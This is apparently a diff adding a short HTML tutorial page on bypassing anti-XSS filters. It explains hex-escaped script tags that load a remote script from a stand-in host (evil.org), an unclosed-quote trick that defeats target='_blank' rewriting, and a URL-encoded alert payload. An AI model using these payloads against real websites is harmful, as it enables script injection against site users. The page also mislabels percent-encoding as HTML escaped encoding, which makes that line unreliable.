@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Bypassing Anti-XSS Filters</title>
+</head><body>One of the most popular alternative character representations is HTML escaped encoding. In this system, the HEX value of the ASCII character is prefixed with the “%” character.<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+<b>Consider</b>&nbsp;a routine that removes the “&lt;“ and “&gt;“ special characters: <br/>
+document.write(cleanSearchString('&lt;&gt;'));<br/>
+The attacker now uses an alternative coding for the filtered characters, “\x3c” and “\x3e” respectively, and initialises their code with “’) +” to escape out of the routine. <br/>
+') + '\x3cscript src=http://evil.org/malicious.js\x3e\x3c/script\x3e'<br/>
+<br/>
+<b>Consider </b>a site that parses the content, <br/>
+&lt;a href="javascript:…"&gt;click-me&lt;/a&gt; <br/>
+and, after processing, becomes: <br/>
+&lt;a href="javascript:…" target="_blank"&gt;click-me&lt;/a&gt; <br/>
+Causing the URL to be opened in a new window.<br/>
+<br/>
+However, if the attacker constructs his HREF as follows, <br/>
+&lt;a href="javascript:..." foo="bar&gt;click-me&lt;/a&gt; <br/>
+it will be interpreted as: <br/>
+&lt;a href="javascript:..." foo="bar target="_blank"&gt;click-me&lt;/a&gt; <br/>
+causing the code to be executed in the same page, under the same DOM.<br/>
+<br/>
+<b>In cases</b>&nbsp;where almost all special characters have are filtered from user supplied strings, attackers must encode the entire attack string. <br/>
+Consider the following URL: <br/>
+http://trusted.org/search.cgi?query=%26%7balert%28%27EVIL %27%29%7d%3b&amp;apropos=pos2<br/>
+<br/>
+The “%26%7balert%28%27EVIL%27%29%7d%3b” resolves to &amp;{alert('EVIL')}; causing in this instance an unexpected JavaScript alert window to popup, with the text “EVIL”.</body></html>
